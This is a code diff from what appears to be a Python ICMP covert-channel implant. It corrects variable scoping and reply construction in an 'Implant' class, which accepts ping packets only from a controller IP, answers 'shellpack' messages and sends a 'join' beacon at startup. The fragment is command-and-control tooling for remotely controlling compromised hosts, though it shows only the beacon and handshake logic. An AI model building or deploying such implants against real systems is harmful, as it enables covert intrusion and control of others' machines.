@@ -17,7 +17,7 @@ class Implant(Host):
         self.controller_ip = controller_ip
 
     def sniff_callback(self, packet):        
-        if packet[IP].src != controller_ip:
+        if packet[IP].src != self.controller_ip:
             pass
         elif packet[ICMP].type != 8:
             pass
@@ -40,7 +40,8 @@ class Implant(Host):
         
         match shellpack['message']:
             case "how are you":
-                shelly.send(self.controller_ip, "join", "fine thank you")
+                response_shellpack = shelly.build_shellpack(self, "join", "fine thank you")
+                shelly.send(self.controller_ip, response_shellpack)
 
         return
 
@@ -52,7 +53,7 @@ def setup_implant() -> Implant:
     
     # Send join command
     shellpack = shelly.build_shellpack(implant, "join", "hello")
-    shelly.send(controller_ip, shellpack)
+    shelly.send(implant.controller_ip, shellpack)
     return implant
 
 if __name__ == "__main__":
